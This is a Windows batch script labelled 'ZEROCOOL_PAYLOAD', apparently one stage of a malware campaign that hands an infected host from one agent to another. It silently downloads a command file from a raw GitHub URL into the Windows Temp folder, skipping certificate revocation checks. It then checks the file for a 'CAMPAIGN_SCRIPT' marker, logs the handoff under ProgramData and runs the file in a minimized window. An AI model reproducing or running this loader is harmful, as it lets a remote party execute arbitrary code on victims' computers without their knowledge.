@echo off
rem ZEROCOOL_PAYLOAD 0.0.2 - bridge: hand the host off to WinRTCS, then the bootstrap retires Zerocool.
rem Marker must stay ZEROCOOL_PAYLOAD: the 0.0.1 Zerocool agent validates it before running.
setlocal
set "ZD=C:\ProgramData\Zerocool"
set "T=C:\Windows\Temp\winrtcs_bootstrap.cmd"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
del /f /q "%T%" >nul 2>&1
%SystemRoot%\System32\curl.exe -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%T%" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_bootstrap.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
if not exist "%T%" ( endlocal & exit /b 1 )
findstr /C:"CAMPAIGN_SCRIPT WINRTCS_BOOTSTRAP" "%T%" >nul 2>&1
if errorlevel 1 ( del /f /q "%T%" >nul 2>&1 & endlocal & exit /b 2 )
echo [%DATE% %TIME%] handoff_to_winrtcs>>"%ZD%\payload.log"
start "" /min cmd.exe /c "%T%"
endlocal & exit /b 0
